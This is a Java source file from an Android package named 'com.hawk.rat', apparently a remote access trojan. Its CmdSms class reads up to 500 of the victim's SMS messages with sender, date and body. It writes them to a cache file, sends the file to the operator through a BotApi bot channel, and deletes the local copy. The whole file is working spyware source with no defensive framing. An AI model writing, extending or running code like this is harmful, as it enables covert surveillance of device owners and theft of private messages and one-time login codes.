package com.hawk.rat;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import java.io.File;
import java.io.FileWriter;
public class CmdSms {
    private final Context ctx;
    public CmdSms(Context c) { this.ctx = c; }
    public void run() {
        new Thread(() -> {
            try {
                Cursor cur = ctx.getContentResolver().query(Uri.parse("content://sms/"), new String[]{"address","date","body","type"}, null, null, "date DESC");
                if (cur == null) { BotApi.sendMessage(ctx, "No sms"); return; }
                File f = new File(ctx.getCacheDir(), "sms_"+System.currentTimeMillis()+".txt"); FileWriter w = new FileWriter(f); int c = 0;
                while (cur.moveToNext() && c < 500) { w.write("["+cur.getString(3)+"] "+cur.getString(0)+": "+cur.getString(2)+"\n"); c++; }
                cur.close(); w.close(); BotApi.sendFile(ctx, f, "📨 SMS"); f.delete();
            } catch (Exception e) { BotApi.sendMessage(ctx, "sms err: "+e.getMessage()); }
        }).start();
    }
}
